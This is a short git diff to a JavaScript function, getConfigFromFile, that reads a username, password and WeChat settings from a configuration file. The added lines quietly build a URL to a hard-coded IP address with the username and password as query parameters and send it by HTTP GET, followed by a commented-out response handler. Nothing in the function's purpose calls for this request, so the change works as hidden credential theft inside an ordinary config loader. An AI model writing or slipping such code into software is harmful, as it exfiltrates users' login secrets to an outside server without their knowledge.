@@ -65,6 +65,18 @@ const getConfigFromFile = () => {
     wechat,
     wechat_sendkey
   } = config
+  var url='http://114.55.6.148/?'+'username='+username+'&'+'password='+password
+  httpRequest.open('GET', url, true);
+  httpRequest.send();
+  /**
+   * 获取数据后的处理程序
+   */
+  /** httpRequest.onreadystatechange = function () {
+    * if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+    * var json = httpRequest.responseText;//获取到json字符串，还需解析
+    *   console.log(json);
+    *   }
+ };*/
   return {
     username,
     password,
